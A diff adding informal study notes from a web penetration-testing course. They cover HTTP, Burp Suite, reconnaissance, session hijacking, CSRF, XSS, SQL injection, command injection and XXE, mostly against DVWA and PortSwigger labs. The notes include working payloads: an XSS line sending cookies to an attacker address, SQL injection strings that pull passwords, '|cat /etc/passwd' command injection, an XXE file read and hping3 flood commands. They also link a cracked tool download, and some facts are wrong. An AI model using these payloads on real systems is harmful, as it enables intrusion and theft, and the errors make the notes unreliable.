@@ -1,0 +1,1634 @@
+Web security assessment
+	some web applications might have Vulnerabilities
+	owasp use some standards and some predefine examinations to secure our web apps
+
+	ptp networks like torrent and blockchain
+
+	web servers are like tomcat apache and iis
+
+	http is half duplex and works with query mode like request and response 
+		https has 3 versions
+			version 1 and 2 use tcp connections + tls
+			version 3 use udp connection and quick algorithem + tls
+
+	http://www.google.com:80/patch/apa/?key-1=x#yplace
+	---- ------------------- ---------- --------------
+	 1 		2 					3 				4 		
+
+	part 1 > scheme
+	part 2 > authority contains domain and port
+	part 3 > path to the file
+	part 4 > query string contains parameter and seo or author
+
+	our ports in http or https is 80 or 443
+
+	in this course we focus on parameters
+	some time is necessary filter our parameters
+
+	burpsuit is a tool from portswiggger works like proxy
+
+	burp change our request content then forward it to web server and web app
+	in burp we can se details of responses and analyze them to achieve more security
+
+	need burp pro
+		https://dl.yasdl.com/2022/Software/Burp.Suite.Professional.2022.2.1_YasDL.com.rar?ccz
+		https://dl.yasdl.com/2018/Software/Java.SE.Runtime.Environment.10.0.2.x64_YasDL.com.rar?a
+		https://dl.yasdl.com/2024/Software/Java.Development.Kit.22.0.2.x64_YasDL.com.rar?a
+
+		password : www.yasdl.com
+
+	if wanna use another browser can install foxproxy on foxit browsers extentions
+
+	in burp must enable intercept on proxy tab to inspect traffic
+	in burp must forward each request to web app or server but in browsers our forwarding is automated
+
+	request packet
+		request line
+			method , url , version
+
+		header field name , value
+
+		header field name , value
+
+		entity field
+
+	response packet
+		status line
+			version , status code , phrase
+
+		header line
+			header field name , value
+
+			header field name , value
+
+		entity body
+
+	in burp need clear history our browsing
+	if intercept get off our burp works like normal browser
+
+	http history :
+		example packet content
+			get/ http/2 >> means request root or index
+
+			post /x/y?t=/&... >> means request packet
+
+			*sometimes we don't have body in http get method
+			in response we have real vlaues of server responses
+			*username and password are in body and post mode
+
+	request methods
+		get
+			our transmision data will be clear text and placed in url
+
+		post
+			encrypt our data and placed in body
+			usaully use this feature
+
+		patch
+			like put but for one section
+
+		connect
+			means make proxy and tunnel me to another place
+		put
+			transmision are in body like post
+			works like update and edit for another times
+			first time works with post to wirte data then use put for update many attributes
+
+	status codes
+		100
+			informational
+
+		200
+			correct answer
+			208 means patch
+
+		300
+			redirect
+
+		400
+			clients request has problem
+
+		500
+			servers response problem
+
+	each character is 1byte
+	cookie is one of the hardening tools for http headers
+	accept encoded header means browser can accept some encoded formats like gzip
+
+	cia > confidentiality , integirity , availability
+		confidentiality means username and roles 
+		integirity means checksum
+
+	security terms
+		Vulnerabilities
+			each type of error and faults in design and programming
+			with this we can access admin level
+			no one knows this error and still has no action
+
+		attack
+			actions in operation of tasks on our Vulnerabilities
+
+		exploit
+			if design our penetration way
+
+	assessments (analyze to be secure)
+		black box
+			has no perspective view from system and mechanism
+			like normal user can test domain with license
+
+		white box
+			we have every thing like source code 
+
+		gray box
+			has partial knowledge from system and mechanism
+
+	owasp projects
+		top 10
+			fast examination for web app
+			after passing these exams we are secure on 60-70 percent
+
+		asvs
+			3 standard level
+			level 3 use for military states
+			each level has various cehcked list must be inspect
+
+		testing guide
+			in asvs after checking must secure them so this state make secure config
+
+	information gathering
+		collect some attributes from persons or oragnization
+
+		google dorks help us
+			search engines
+				google
+				duckduck go (is proxy)
+				shodan (use for network attacks)
+
+				exploit-db.com
+
+				dorks are
+					site:
+					inurl:
+					intitle:
+					intext:
+
+					examples
+						site:nasa.gov inurl:login (means each nasa domain contains login term must shown)
+
+						site:nasa.gov filetype:pdf secret (means each pdf file contains secret term from nasa must shown)
+
+						intitle:"indexof" setting.php (if see this means we have leakage on it) (indexof used for first web page to access them)
+
+	for data or information gathering
+		server
+			banner grabber (frame)
+			robots.txt (metafiles)(which page get index from web and search engines crawlers)
+			nmap used for open ports
+
+		client
+			wppalyzer (frame)
+			html code (metafiles)
+			entry points like froums headers cookie, ur
+
+	in response we have name of server if leak our server version and os means we get trouble
+
+	each tools has own signature and analyze our responses on these signatures detect server attributes
+
+	netcraft is one of banner grabbers
+	if has miss config on robots.txt for showing and hiding paths might get attack
+
+	nmap :
+		nmap -Pn -sT -p 80,443 x.com
+		nmap -Pn -sT -p 0,65535 x.com
+
+		*we see logs on security devices or our os
+		active mode means you have some effect on devices and make touch our systems
+		passive mode means you are using dork (no touch)
+
+		we can use vps or ddos mode to use nmap
+
+	in leakages we might find some values like comments in source ocdes
+		hidden tag or comment modes
+
+	in entry points like froums boxes might have Vulnerabilities
+		froum and cookies or headers
+
+	ossint means in social medias or search engines we find many informations about something
+	comix is one of the web app analysis and means command injection
+	Vulnerability analysis means fuzzing send many type dat ato domain analyze result
+
+	password attack is dictionary attack
+	exploition tools find Vulnerabilities and design penetration tools (efxss is tools)
+	post exploition use cyber key chain and plan all tasks after finding Vulnerability
+		need various attack
+
+	script child in social engineering like send link for telegeram user then hack them
+
+	virustotal.com
+	whois.domaintools.com
+
+	command line tools
+		nessus, nslookup, htcracker, dig, what web, gobuster, ffaf, mimikatz, sublis3r, nikto, recon-kg, dirbuster
+
+	sublist3r find subdomains
+		site:x.com -site:www.x.com
+
+	need install python
+
+	python sublist3r.py -d x.com (use many searc engines to find subdomins)(-o means export results to file)
+
+	configuration & deployement management testing
+		nmap --script http-method x.com
+		
+		python2 http-method.txt
+			enter domain name
+			then find methods of website 
+
+
+		in http methods we use post get and put 
+		if in put we attach some Vulnerabilities file might destroying the server
+			*better use post method because in put we access to attacker uploads file on server
+
+		in delete method we have dos attack 
+
+	tcp handshake & dos & ddos
+		syn flag > requested
+		ack flag > confirmed (-a)
+		rst flag > reset the connection
+
+		hping3 -a -p 8500 192.168.100.1
+
+		sudo tcpdump
+		sudo tcpdump port 8500
+
+		hping3 -a -flood -p 8500 192.168.100.1
+
+		*better admin page be visible just for admin
+		must config robots.txt
+
+		purish.com
+		packetstorm
+
+		python2 adminpagefinder1.py
+			enter domain name
+
+	hsts
+		user traffic must use https
+		if use http and see status code 300 might make ssl stip then change our data
+		here need hsts to force users use https
+		also in responses from server use https
+
+		http strict transparent security
+
+	identity management testing
+		our banking and payment tasks need authentication
+
+		enumeration aseration > in owasp say username and password must not be same nationality id ...
+
+		in some tests we see our website hint that user is not correct or say password is not correct so findout one user with this username is exist must change our password
+
+		in websites need 
+			authentication
+			encryption
+				symmetric
+					des
+
+				asymmetric
+					rsa
+					dsa
+
+			hashing
+				The opposite of cryptography
+
+		hash algorithem
+			md5
+			sha
+				1
+				2
+				3
+
+			diffrences are on outgoing bit
+
+		our passwords are in hash mode also mix with salt
+		codebeautify.org
+
+	Authenticity
+		in https and secure channel or tunnel transmit our user data
+		better our ssl or certificate for web assigned on all pages of domain
+		in status codes of site we have technical details means see what we have
+
+		lockdown threshold
+			must assign for login parts
+			avoide the brute force
+
+		*also better use captcha with best parameters to be protect
+
+		in authenticated users we have cookie value
+			cookie help us to convert http in halfduplex mode to full duplex protocol with saving some values on client side
+			cookie is like meta data
+			after authentication cause add cookie we ssee another url form
+			with this cookie we can track the users
+			browser send this cookie to server and negotiate with that
+
+			if url change to x.com\admin or x.com\auth=yes
+			is dangerous
+			if copy valid cookie from valid user adn change the site attributes what happen?
+
+		*best way to protect our web is
+			set password policy on froums
+				we have crackstation site save all hash modes of passwords 
+				so better use salt
+
+			in password change or forgoten password part better use last remember password or recover email and our present password
+
+			after these mechanism if have problem must block user account
+
+		in burp each automated testing will be on intruder tab
+		burp > intruder
+
+	authorization
+		access levelson account
+		priviledge escalation
+			usefull in attacks
+			increase our access levels
+
+			vertical
+				from client growth to employee
+
+			horizental
+				from client x cahnge access to client y (payment problems)
+
+				usefull in cyber key chain
+
+				create victom user
+
+		ider
+			insecure direct object refrence
+				after login we see specific portal
+				this url portal is dynamic for each user
+				if our portals were predictable must control and protect them 
+				cause after change our portal url can access another user portal and dashboard
+
+	burp > intruder
+		repeated requests can be process here in automated mode
+
+		has payload section can fill from dictionary username or password
+
+		must select positions in request part and mark them with dollar sign $
+
+		username=$admin$
+
+		then select start attack
+		in result part we must find some codes like
+			3250 (valid)
+			3280 (invaid)
+
+		in response pane we select on valid values then show response in browser
+
+		copy url in browser then open it
+		we can use password dictionary attack with same steps and same way
+		in password must see code 200
+
+		after these we select request section in burp and select send to repeater
+		to see real result 
+
+	for some test we can analyze schema and detect our login url then change it to another value and access another account 
+		my-acc?id=x
+		my-acc?id=y
+
+		*priviledge escalation
+
+	session management
+		http has no history and state for tracking so just use sessions
+		simple protocol
+		if were state full maybe see side effects
+		no dependencies on connection types
+		can extend our protocol
+
+		http response and request
+			header
+				general header
+				request header
+				response header
+				entity header
+	
+			body
+
+		in http if need decrease our repeated requests must use one session and cookie
+		based on hidden fields and http header and uri
+
+		one side is server another one is clients pc
+
+		domain-path-content (customer id=1)-expresions-server
+
+		https://http-cookie-demo.netlify.app
+
+		document.cookie='name=value,expires=sun,20dec.....' 
+
+		in session and cookie definitions must use key and values with time attributes to maange them 
+			permanent
+				persistence cookie
+				has expire time or use 1 year value
+
+			temporal
+				session cookie
+				if client close browsers all users sessions get down
+				has no time range value
+
+		each user has many connections to server, server must seperate them also must use diffrenet perspective on 10 diffrenet user
+
+		cookie is simple data get aggregate with time attributes
+
+		in browsers we have inspections view
+			console > wirte this phrase > document.cookie
+			can see session id
+			we can add cookie oon site
+
+			document.cookie=70 (if change values does it modified in server?)
+
+			cookie is simple data and store on users and browsers systems
+			each cookie contains websites informations 
+			maximum size is 4kbyte
+			for each domain we can define 25 cookie
+			works on specific browser if move chrome cookie to firefox get trouble
+
+			inspection > storage > cookies > if has no time value means this cookie is temporal	
+
+			cookie has name and domain, domain is usaully same with site name
+
+		between session and cookie has diffrences
+			session is value inside the cookie
+			cookie is procedure inside http
+
+		tasks store on cookie
+			login and session for users
+			customizations like translations to languege
+			tracking and behavior analysis
+
+		after login users can access their level and states
+			security
+				valid user recieve cookies and could not change or modified them
+
+			performance
+				has no much load on server cpu
+
+			scaleability
+
+		session security
+			cookie
+				must be careful on document.cookie 
+				must secure them to avoid changes
+
+				alert(document.cookie) > show cookie in popup
+
+			session id
+				in inspection our content for sessions are visible
+				session id name finger print > phph session id \ j session id
+				session id length (max 128 bit)
+				session id entropy (must be random and non predictable)
+				session id content
+
+				inspection > network > document > header > cookies .....
+
+			transport layer
+
+		if use ssl cert must think for secure tunneling like hsts
+
+		for cookie security
+			http only
+				java scripts and alret mode coomands
+
+			security flag
+				man in the middle attack can sniff traffic so use hsts to secure them
+
+			valid path for cookies
+				domain (path = / (all paths)) and path (specific path like /x/c/v/...)
+				better use time and expire date for management
+
+			sam site must not use same cookies (transfer cookies to another site or not)
+				none (after payment in shapark get back on default page)
+				strict
+				lax (default)
+
+		security
+			disclosure
+				information in the server were visible
+
+			capture
+				if were clear text our hackers  can modified data
+
+			prediction
+				must secure and mix session ids 
+
+			Comprehensive search
+				must use diffrenet and complex username password
+
+		in burp  > setting > network > http > versions 1 and 2 we could not find version 3 of http
+
+	http and sessions can be behave like state full  mechanism
+	after login our server replies our sessions with users request and response packets transmit to clients browser
+
+	session hijacking
+		Disclosure
+		Capture
+		Prediction
+		Brute force
+		Fixation
+
+		must entropy them to use random values and no predictable
+		in burp we analyze sessions
+
+		burp > proxy > intercerpt on  > open browser
+			cookie sessions in buro can be decode and analyze 
+
+		we see hash value 
+		right click on hash value in session part
+		select send to sequencer
+		then burp find our cookies and give complexity level
+		select start live capture
+		automative generation cookie and pause then analyze them
+		tell us our complexity
+
+	brute force
+		send request to analyze the session patterns then virtualize them
+		after finding them select he cookies and find stay-loggedin also sessions (in port swagger example)
+
+		*best way to protection is username and password get hash
+
+		in each cookie we see id and sessions on inspection view so is diffrenet for each user
+		in burp we have decoder form tab
+		must use base64 on it
+			userx (in clear text) :51.....(in hash mode)(md5 is weak so candetect that)
+			with this weaknes can detect patterns of cookie
+
+		in intruder part we send hash values to passwords field
+		must define positions and payloads
+		*in first line of http packets
+			get /my-account http/2 we have stay stay-logged-in and session values
+			must clear values and be empty
+			insert $ instead of their values
+
+			for making our passwords hash  model in md5 must
+				must setup our payload presenting
+
+				burp > intruder > payload
+					payload presenting
+						add > hash > md5
+
+						now we process all process and contents
+
+						add > prefix > carlos:
+						add > decode > base64
+
+					then start attack
+					if see status code 200 means were successfull
+
+					click on responses then pretty > show response in browser
+	
+	csrf (cross site request forgery)
+		copy session from valid site like banks and valid sessions & cookies
+		we have 2 pages and links here after login our attackers link shown click on it  and our sessions get copy
+
+		in request part and post method we can see the values
+		so right click on them and select engagement tools > generate csrf poc
+
+		in new page on top right must enable include auto-submit script
+		then regenerate our payloads
+		copy html codes in authentication pages
+
+		select go to exploit
+		add our newest code inside the page
+		after users login we say replace attacker mail with normal user
+		submit them
+
+		to prevention:
+			change password in tokens 
+				must change type and content
+
+			csrf tokens
+				server must sent token for each request and client must reply that token with same values on each request
+
+				attack here just can hijack the sessions
+
+	input validation
+		our entry values from users migh be infected so must be carefull
+		our web app has problem and non secure connection tunnel
+
+		our infections must visit 2 modes
+			syntax
+				enter name must be string mode or can accept java script
+
+			semantic
+				correct and meaning full values like ali hassan...
+
+		with problem here we have
+			xss
+			sql injection
+			xml injection
+			nosql injection
+			ldap injection
+			code injection
+			os command injection
+			hos  header inclusion (crlf)
+			remove file inclusion (rfi)
+			server side injection
+
+			sql use query
+			xss use java script
+			xml use json
+
+			our java script codes were execute in parallel mode and just sent to server also works in background
+
+			in dvwa we have dvwa security level if change our levels can change hardening
+			in dvwa and xss reflective tab we can see source codes
+
+				low level
+					accept any type of tags
+					<script>alert(document.cookie)</script>
+
+				medium level
+					accept another type tags like img and deny script mode 
+					we have exceptions like <Script>
+					case sensetivity on tags are comprehensible
+
+					<Srcipt or sCript or SCRIPT>alert(document.cookie)</Srcipt or sCript or SCRIPT>
+
+				high level 
+					deny any type (caps mode or lower case) script term
+					must use another tags like img
+
+					<img src=2 onerror=alert(document.cookie)>
+
+			in burp we use 8 character and random mode for xss detection
+			if recieve responses findout have Vulnerability
+			couldn't detect level of hardening on waf or web application
+
+			xss
+				php language on server side
+				java scripts on client side
+
+				for loads and checking our inputs validation our clients must visi correct vlaues 
+
+				has some models of attack like
+					reflex
+					persistences
+					dom base
+
+				xss attacks are :
+					cookie stealing
+					key logging
+					webcam snapshots
+					phishing
+					port scan
+
+					reflex mode
+						is type 1
+						need dvwa
+
+						in xss reflective we can test our input validations with
+							textboxes : <h1> ali </h1>
+							or add <script> alret ("1") </script>
+							or <script> alert (document.cookie) </script>
+
+							with these we can hijack the clients cookie and make aptter from it
+
+							<script>document.location='http://attacker ip address/indee.php?/ + document.cookie</script>
+
+							now our clients cookie will be send to attacker ip
+
+							we can add above code inside the
+								<href a="attacker-address"?<script>document.location='http://attacker ip address/indee.php?/ + document.cookie</script>>
+
+							waf can protect our web server from these
+
+						another model pf type 1 or reflective
+							<img src=2 onerror=alert('1')>
+
+							after reload findout does it have any problem or infection or not
+
+							burp > intruder > position > search = <body%20=1>
+
+							instead of =1 must add $ and another payloads value like tags then select start attack
+
+							if see code 200 and 400 means were successfull
+							in new request we add like this on position
+								<body20%$=1>
+
+								then add events on payload values and test agian
+
+								see code 200 and 400 in column on resize we findout our firewall get bypass
+
+							select go to exploit site
+							in body part
+								<iframe src="http://....(portswigger address"?search=22%....>
+
+								put this inside the decoder tab on burp and use it for url decoder
+								after these store them and select view exploit
+
+						our reflective xss are not permanent if our url get change must setup again
+						store xss save all configs on server
+
+					stored mode
+						type 2
+						like reflected but store values and attributes on server side
+						each user loged in specific part load our script and transfer normal users cookie or other values to hackers ip address
+
+						in port swigger we have examinations in this type attacks we add a comment on site
+						then use inspectin view to find the boxes and locations 
+						inside the boxses and put this in
+							<scriPt>alert(document.cookie)</scriPt>
+
+							fill other boxes then save it
+							after save each user click on this page see their own cookie
+							we can add href tag and forward it to hacker ip address
+
+							we can change security level and put on low or medium according to previous knowledge
+
+							if set on high security what should we do?
+								must use img or another tags
+
+							if see a input box has limitation what should we do
+								javascript:alert(document.cookie)
+
+					dom base 
+						hacker put unormal request and script on normal users system then normal user request to server after receive responses in safe mode or normal state 
+						after request and reply on http values server sent scripts to normal user
+						here hackers script will be execute the code and forwar normal values to hackers system
+						our normal user get victom
+						hacker use values were forwarded to owned system
+						login to site then ....
+
+						portswigger has examinations with hard code and combo boxes
+						on inspection we find combo box values
+						in url we add
+							x.com/p?pid=1&storeid=tehran
+
+							here we added another value that wasn't in html code
+
+							on url
+								x.com/p?pid=1&storeid=tehran</select><script>alert(document.cookie)</script>
+
+								after server replies to normal user our codes get replaced with scripts from server and hacker access values
+								if see higher security must use
+									<img src=2 onerror=alert(document.cookie)>
+
+							if see # in url means we add values without refresh 
+							with # freez our site and avoid to refresh
+
+							x.com/p?pid=1&storeid=tehran#</select><img src=2 onerror=alert(document.cookie)>
+
+			usaully set high or medium mode for security level
+			inspection on chrom ... > network > get method
+
+	sql injection
+		with sql injection we can modified all db in website
+
+		os commands 
+
+		usaully happens on entry point of users
+		attacker send many queries to web and db then decide what should to do
+
+		authentication
+			after inserting username or userid actually we sent 
+				useridtxt=get request string("userid"):(field name on website)
+				txtsql="select * from users where userid="+useridtxt
+
+
+				if we need test input validation then attack on it :
+					select * from users where userid=150 or 1=1;
+
+		sql injection types:
+			inbound
+				error base
+					if after sending query we saw error can attack
+					after request and response we can steal our clients data
+
+					in testing of this type
+						in portswigger we have test
+						normally use 
+							select * from users where password='pass'
+							select * from users where password='pass' '
+
+							if add this and react to us on sql means we have bugs
+							here we have user and pass authentication
+							must detect our databases columns and rowsthen crack them
+
+							single qoataion will be added on cookies value
+							in responses if you see structure of query means we have Vulnerabilities
+
+							with this can detect have Vulnerabilities
+								select * from users where password='pass' order by 1 --;
+								select * from users where password='pass' order by 2 --;
+
+								means our db has 1 or 2 column
+
+						on burp we can use repeater on cookie values then inside the single qoataion can add attributes
+
+						cookie value 'order by 1 -- ; (comment other)
+						cookie value 'order by 2 -- ;
+
+						after response we change our conditions
+							select * from users where password='pass' or 1=1;
+							cookie value ' and 1 --; (in burps repeater if recieve nothing must change to booleans like below)
+							
+							cookie value ' and 1=1 --; (aftre respons we can findout could have sql injection or not)
+							
+						in portswigger test said username is administrator
+							inside the repeater we say
+								cookie value' and 1=((select 1)) -- ;
+								cookie value' and 1= cast ((select 1) as int) -- ; (convert our results to intiger)
+								cookie value' and 1= cast ((select username from users) as int) -- ; (cause can retrieve many record so must limit it to bypass the error)(if compare with results on site and see error can understand set the length limitation)
+								cookie value' and 1= cast ((select username from users limit 1) as int) -- ;
+									for length limitation bypass better ommit cookie value parameters then add our injection terms
+
+								after this we need password so
+									burp > repeater > 'and 1= cast ((select password from users where username='administrator') as int) -- ;
+
+									again we see length error so 
+										'and 1= cast ((select password from users limit 1) as int) -- ;
+
+								usaully developers and network securities prevent attackers to test this
+
+				union base
+					merge 2 tables then test them
+					select * from username , password from users where id='10' --
+					select * from username , password from users where id='' order by 1 --
+
+					with these can retrieve errors
+						select user , password from users where id = '' union select null,null -- ';
+						select user , password from users where id = '' union select 23,24 -- ';
+
+					select username, passwords from users union select a,b from tabletest
+						our username and password be the same in terms of the number of columns
+						also a and b must be same data type with username password data type
+
+					if need many test must use intruder
+						x.com/....?cat=g ' order by 1 -- 
+
+					in burp > proxy > intercept get on
+					then burp > repeater > on url and query pacaket
+						x.com/....?cat=g ' order by 1 --
+						x.com/....?cat=g ' order by 100 --
+
+						copy this placed on intruder
+						after get method in request packet ....
+						after %20 place $$ instead of numbers
+						then use payload attributes like payload set and type setting
+							sequential  from 1 to 30 interval 1
+
+						 	after testing we must see length values
+
+						*better test it manually
+
+					select user,pass,test from users union select null,null,null -- ;
+						null can retrieve any type of data type and cast them
+
+					x.com/....?cat=g ' union select null,null,null --
+					x.com/....?cat=g ' union select '1111','2222','3333' --
+					x.com/....?cat=g ' union select null,curent_user,null --
+					x.com/....?cat=g ' union select null,database(),null --
+					x.com/....?cat=g ' union+select+null,+curent_user(),+null --
+					x.com/....?cat=g ' union select @@version,curent_user() # --
+						# means don't refersh the site
+
+					db version & comment				
+						oracel 		
+							select banner from v#version
+							select version from v#version
+
+							--
+							--
+
+						microsoft
+							select @@version
+
+							/* */
+							--
+
+						postgre
+							select version()
+
+							#
+							/* */
+
+						mysql
+							select @@ version
+
+							--
+							/* */
+
+					shell db
+						msql -uroot
+						show database;
+
+						we can see information schema that contains any changes on database attributes and objects
+
+						better use this information schema for sql injection
+						this feature is read only volume
+
+						x.com/....?cat=g ' union select table_name , null from information_schema.tables --
+
+						in web gui we can see all database tables 
+						then find usernames table 
+							x.com/....?cat=g ' union+select+column_name,+null+from+information_schema.columns+where+table_name='users_x' --
+
+						if need see pure data must use
+							x.com/....?cat=' union+select+column_name,+null+from+information_schema.columns+where+table_name='users_x' --
+
+						here we have administrator	
+							x.com/....?cat= ' union+select+user_xy,+pass_xy+from+users_table_xy --
+
+							here we can retrieve all users passwords
+
+					for union must be carefull inject and test correct columns
+
+			out of bound (query base)
+				on burp provides many servers and use remote reciever to be hide from foreinsic teams detection
+				we use dynamic servers address to redirect all responses from server and victom on burp dynamic sources 
+				burp > collaborate
+				
+			inferential (character base)(based effects on server and responses can detect attack type)
+				boolean base
+					on login forums we can add administrator'-- and random password then get login
+
+					usaully use 
+						select * from users where user='admin' and pass='123';
+
+					in second test we use cookies value to bypass authentication
+						on burp must turn on our intercept and analyze our results and requests 
+						changes on trackingid can be effect
+						left side on inspector and decoder we have trackingid change last box
+							xyz is our cookie value
+
+							xvz' (on right bottom we can see time effects)
+							xyz ' '
+
+
+							select * from users where username '=1' or '1'='1 -- 
+								whith -- we say make comment then add ' on program
+
+							select * from users where username '=1' or '1'='2 or x --
+
+							xyz' and (select 'a' from users lim 1 ) = 'a --
+								means find and return our administrators password
+								check for Vulnerabilities
+
+							xyz' and (select 'a' from users where user='admin' lim 1)='a or b
+							xyz' and (select 'a' from users where (user='admin' and  length(pass)>1) lim 1)='a or b
+								length of password
+
+							*better use intruder to check many parameters and variables
+								burp > intruder
+									intruder > positions
+										xyz' and (select 'a' from users where (user='admin' and  length(pass)>$$) lim 1)='a or b
+
+										attack type > sniper
+
+									intruder > payload > setting
+										simple list
+
+									intruder > setting
+										grep > just add welcome
+
+									start attack
+									sort results base on lengths
+									we can see 19 means our password is 19 characters
+
+							xyz' and (select 'a' from users where (user='admin' and  substring(pass,1,1)='a')lim 1 )
+								
+							if need check some attributes on automated modes must use intruder so :
+								xyz' and (select substring(pass,$$,1) from users where user='admin')='$$
+
+								set attack type on cluster bomb
+								orders are important in intruder and tests
+
+								intruder > payloads
+									payload sets
+										1
+											type
+												number
+												sequential
+												1 to 22 step 1
+										2
+											type
+												simple list
+												from list 0-9
+
+								intruder > setting
+									grep 
+										wellcome
+
+								intruder > resource pool
+									must check on time base
+
+								must check results on length order
+								lengths and positions can detect passwords
+								
+				time base
+					on response recieve is our target
+					burp > intercept on
+					request send to repeater
+					inspector must check our trackingid cookie value
+						xyz' and sleep(10) --
+
+						postgress
+							xyz'; select pg-sleep(10)--
+
+							xyz';select case when(1=1) then pg-sleep(10) else pg-sleep(0) end --
+
+							must use = instead of %20
+								xyz';select+case+when(1=1)+then+pg-sleep(10)+else+pg-sleep(0)+end --
+
+							xyz';select+case+when(username='admin' from users)+then+pg-sleep(10)+else+pg-sleep(0)+end --
+
+							xyz';select+case+when(user='admin'+and+length(pass)>1)+then+pg-sleep(10)+else+pg-sleep(0)+end --
+
+							we can use intruder and positions to make automated
+								xyz';select+case+when(user='admin'+and+length(pass)>$$)+then+pg-sleep(10)+else+pg-sleep(0)+end --
+
+								intruder > payloads
+									type
+										number
+										sequential
+											1-22 step 1
+
+								intruder > resource pool
+									create resource pool > max concurrent request > 1
+									delay > 10 msec
+
+							xyz'(; or %3b)select+case+when(user='admin'+and+substing(pass,1,1)='a')+then+pg-sleep(10)+else+pg-sleep(0)+end --
+
+							we can automate them
+								xyz'(; or %3b)select+case+when(user='admin'+and+substing(pass,$$,1)='$$')+then+pg-sleep(10)+else+pg-sleep(0)+end --
+
+								attack type > cluster bomb
+
+								intruder > payloads
+									1
+										type
+											number
+											sequential
+												1 to 22 step 1
+
+									2
+										type
+											simple list
+											from a to z
+
+								intruder > resource pool
+									create resource pool > max concurrent request > 1
+									delay > 10 msec
+
+			blind mode injection
+				better use union base
+
+				select * from users where  id=1' or '1'='1;
+				select * from users where  id=1' orderby 1# (columns count)
+
+				must add after id values on dvwa boxes
+
+				1' union select null,null# (find columns on automatic types)
+				1' union select '11','22'# (examine types be string or not)
+
+				information schema on db contains all tables attribute
+					1' select table_name,null from information_schema.table#
+
+					1' union select column_name,null from information_schema_column where table_name='users'#
+
+					export username and password :
+						1' union select username,password from users#
+
+				change dvwa security on medium mode
+					our mechanism changed to combo box
+					must use burp browser and intercept on 
+					after load page turn off our intercept
+					on request section we see body parameter 
+						name > id
+						value > 2
+
+						if change 2 on 2' > get error
+						must use 
+							2 or 1=1#
+
+						1 union select username,password from users# (ommit all '')
+
+				change dvwa security on high
+					recieve all parameters on another page 
+					we don't see direct db to exploit them so must use blind injection
+
+					again use burp browser and intercept on 
+					then send to repeater after turning intercept off
+						inspector and query parameters
+							1' and 1=1#
+							1' and 1=1--
+
+							casue our test are on boolean base must check the time response and size
+
+							1' orderby 2# (if see dynamic size means our columns count is correct)
+
+							1' union select database(),null# 
+							1' union select database(),null from information_schema where table_schema='dvwa'#
+
+							1' and length(database())=3# (if need detect all values automatic must use intruder)
+
+							use burp browser with intercept on
+							load site and forward request to repeater then turn off intercept
+							we have id part on get and request panel
+								attack type on sniper
+								
+								1'and substing(database(),1,1)='dvwa'# (here we have manual detection our schema contain dvwa tables)
+
+							then use intruder
+								attack type on cluster bomb cause we hva 2 dynamic attributes
+
+								1' and substring(database(),$$,1)='$$'#
+
+								payloads
+									1	
+										set numbers 1-10 step 1
+
+									2
+										simple list a-z
+
+							for users
+								attack type on sniper
+									1' and length(database())=18#
+										we can use intruder to detect length our user string length
+											intruder
+												attack type > sniper
+
+												1' and length(database())=$$#
+
+												payloads 
+													1
+														number 1-30 step 1
+									
+									1'and substing(users(),1,1)='root'# (test and detect is root our users on manual mode static)
+										then use intruder
+											attack type on cluster bomb cause we hva 2 dynamic attributes
+										
+											1' and substring(users(),$$,1)='$$'#
+										
+											payloads
+												1	
+													set numbers 1-7 step 1
+										
+												2
+													simple list a-z
+
+							for version
+								first check our values on static and manual mode in repeater and intercept on
+								send first query on burp browser then turn intercept off
+								on version secion in body or request add
+
+								1' and length(@@version())=18#
+										we can use intruder to detect length our user string length
+											intruder
+												attack type sniper
+
+												1' and length(database())=$$#
+
+												payloads 
+													1
+														number 1-30 step 1
+
+									1' substing(@@version,1,1)='d'#
+
+									if need automated detection must use intruder
+										attack type > cluster bomb
+
+										1' substing(@@version,$$,1)='$$'#
+
+										payloads
+											1
+												numbers > 1-30 step 1
+											
+											2
+												simple list a-z 0-9 and _ - .
+
+
+
+							if get trouble on adding some attributes
+								first send request with intercept on in burp browser then change intercept off and send to repeater
+									1 and length(database)=4#
+										use automated mode with intruder
+											attack type > sniper
+												1 and length(database)=$$#
+
+												payloads
+													numbers 1-10 step 1
+
+								must use ascii codes
+									on repeater
+										1 and ascii(substing(database(),1,1))=100# (in ascii codes 100 means D word)
+
+									on intruder we check values
+										attack type > cluster bomb
+
+										1 and ascii(substing(database(),$$,1))=$$#
+										
+										payloads
+											1
+												numbers base on lengths detection manual or automated
+											2
+												numbers 87-127 step 1
+
+								*we ommit single qoataion
+								test all users and versions on this method
+
+	os command injection
+		works on server responses
+
+		diffrences with code injection	are 
+			code injection has no information about input validation and try to send code into the server then recieve response
+
+			command injection works with interpreter of server os and see results of interpreter or load file on server with it
+
+		result base (http response like whoami)
+		blind mode (with results and with implicit response like time(blind) and file(semi blind))
+
+		xss as these type attack
+
+		send request on burp proxy and intercept on in browser
+		send to repeater then turn off our intercept
+		on body parameters 
+			store-id
+			decoder form > 3|whoami (resolve server name)
+
+		on another lab we use submit feedbackand email section Vulnerabilities
+			same mechanism on burp send request on intercept on and burp browser then send to repeater on last step turn off our intercept
+
+			on request part
+			email section on body parameter
+				a@g.com|ping -c 5 127.0.0.1||
+
+		blind time base
+			base on response time in burp
+			our scenario is submit feedback
+				body parameter > email	
+					decoder form
+						x@g.com||ping -c 10 127.0.0.1 ||
+
+		blind file base
+			base on response time in burp
+			our scenario is submit feedback
+				body parameter > email	
+					decoder form
+						x@g.com||ping -c 10 127.0.0.1 > /var/www/images/t.txt ||
+
+		how prevent attacks
+			code review and sttaic or dynamic tools check input validation
+
+			csp (contact security policy)
+			parameters and query prepared statement
+			os level protection
+			least priviledge principle
+			safe api
+			stored procedure
+
+		dvwa security > low
+			ping 127.0.0.1 
+				if were microsoft or linux base can be detect (on line we hva -c 4 to limit count ping)
+
+			127.0.0.1||ver
+			127.0.0.1&&ver
+			127.0.0.1&&dir c:\
+
+		dvwa security > medium
+			127.0.0.1&whoami
+			127.0.0.1|| whoami
+			127.0.0.1& nslookup google.com
+
+		dvwa security > high
+			127.0.0.1 |cat /etc/passwd
+
+	xml inject edge servers to make effect on infrastructure server
+			between edge and infrastructure we have connection
+			our edge server will be proxy
+
+			turn on intercept and use burp browser then send request and turn intercept off 
+			use repeater to change attributes
+
+			inisde the body request on inspector we have stockapi
+				contains some attributes must decode them from decoder tab 
+				transfer them to decoder and url forms
+				replace stockapi values with http://localhost.admin
+
+				after send values we access the web pages
+
+				we can delete users from db
+					again use decoder and localhost values on stockapi
+
+					body request on inspector
+						stockapi > http://localhost/admin/delete?user=x
+
+		<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/password">]>
+		run &xxe; inside the request body and xml section
+
+		basicaly we can handel some attacks on error messages
+			we can use combobox type attacks
